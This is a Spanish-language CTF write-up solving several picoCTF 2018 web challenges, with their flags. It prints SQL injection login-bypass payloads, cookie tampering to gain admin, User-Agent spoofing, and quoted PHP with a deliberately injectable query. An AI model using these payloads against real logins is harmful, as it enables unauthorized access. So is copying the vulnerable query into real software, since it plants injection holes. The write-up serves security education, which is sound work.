# Web
## Inspect Me
*Inpect this code! http://2018shell.picoctf.com:56252*

Lo primero de todo abrimos la pagina web, alli miramos el codigo fuente y obtenemos la primera parte de la flag en el html
```html
	<!-- I learned HTML! Here's part 1/3 of the flag: picoCTF{ur_4_real_1nspe -->
```
Vemos que hay dos archivos mas mycss.css y myjs.js

En el de CSS vemos lo siguiente
```CSS
/* I learned CSS! Here's part 2/3 of the flag: ct0r_g4dget_9dd3b33c} */
```
En el de JS encontramos la ultima parte
```Javascript
/* I learned JavaScript! Here's part 3/3 of the flag:  */
```

Flag:  picoCTF{ur_4_real_1nspect0r_g4dget_9dd3b33c}

## Client Side is Still Bad
*I forgot my password again, but this time there doesn't seem to be a reset, can you help me? http://2018shell.picoctf.com:8420*

Mirando el código fuente encontramos el siguiente script
```javascript
function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(split*7, split*8) == '}') {
      if (checkpass.substring(split*6, split*7) == '06ac') {
        if (checkpass.substring(split*5, split*6) == 'd_5e') {
         if (checkpass.substring(split*4, split*5) == 's_ba') {
          if (checkpass.substring(split*3, split*4) == 'nt_i') {
            if (checkpass.substring(split*2, split*3) == 'clie') {
              if (checkpass.substring(split, split*2) == 'CTF{') {
                if (checkpass.substring(0,split) == 'pico') {
                  alert("You got the flag!")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
  }
```
Podemos ver una serie de comprobacioes con cada fragmento para formar la contraseña, las reensmablamos y obtendremos la flag

Flag: picoCTF{client_is_bad_5e06ac}

## Logon
*I made a website so now you can log on to! I don't seem to have the admin password. See if you can't get to the flag. http://2018shell.picoctf.com:37861*

Si testeamos las funciones vemos que podemos logearnos como cualquiera execpto como admin sin conocer la password, tras logearnos se nos pone una cookie llamada admin en false, si cambiamos su valor a True podremos ver la flag

Flag: picoCTF{l0g1ns_ar3nt_r34l_a280e12c}

## Irish Name Repo
*There is a website running at http://2018shell.picoctf.com:11899. Do you think you can log us in? Try to see if you can login!*

Una vez localizado el login probamos con los payloads basicos para el login y al menos los siguientes 3 funcionan sin problema
```
' OR 1=1; --
admin' OR 1=1; --
admin' ;--
```
Flag: picoCTF{con4n_r3411y_1snt_1r1sh_9cbc118f}

## Mr.Robots
*Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell.picoctf.com:15298*

Mr Robot = Mira Robots.txt

```
User-agent: *
Disallow: /c4075.html
```
Vamos a la direccion disallowed y obtenemos la flag

Flag:  picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_c4075}

## No Login
*Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. http://2018shell.picoctf.com:14664*

Se parece mucho al portal de Logon , asi que lo mismo simplemente necesitamos la misma cookie pero aqui no ha sido implementada, hagamos la prueba

Creamos una cookie de nombre admin y de valor true y obtenemos la flag
Flag:picoCTF{n0l0g0n_n0_pr0bl3m_eb9bab29}

## Secret Agent
*Here's a little website that hasn't fully been finished. But I heard google gets all your info anyway. http://2018shell.picoctf.com:46162*

Llegamos e intentamos logearnos, nos dice que no somos google y nos comunica nuestro User Agent, buscamos un user agent de google, por ejemplo:
```
Googlebot/2.1
```
Cambiamos y recargamos obteniendo asi la flag
Flag: picoCTF{s3cr3t_ag3nt_m4n_ac87e6a7}

## The Vault
*There is a website running at http://2018shell.picoctf.com:64349 Try to see if you can login!*

Esta vez nos dan el fuente
```php
  ini_set('error_reporting', E_ALL);
  ini_set('display_errors', 'On');

  include "config.php";
  $con = new SQLite3($database_file);

  $username = $_POST["username"];
  $password = $_POST["password"];
  $debug = $_POST["debug"];
  $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";

  if (intval($debug)) {
    echo "<pre>";
    echo "username: ", htmlspecialchars($username), "\n";
    echo "password: ", htmlspecialchars($password), "\n";
    echo "SQL query: ", htmlspecialchars($query), "\n";
    echo "</pre>";
  }

  //validation check
  $pattern ="/.*['\"].*OR.*/i";
  $user_match = preg_match($pattern, $username);
  $password_match = preg_match($pattern, $username);
  if($user_match + $password_match > 0)  {
    echo "<h1>SQLi detected.</h1>";
  }
  else {
    $result = $con->query($query);
    $row = $result->fetchArray();
    
    if ($row) {
      echo "<h1>Logged in!</h1>";
      echo "<p>Your flag is: $FLAG</p>";
    } else {
      echo "<h1>Login failed.</h1>";
    }
  }
```

Como podemos ver no podemos usar OR para SQLI, probemos con la básica
```
admin';--
```
Y tenemos flag
Flag:picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}
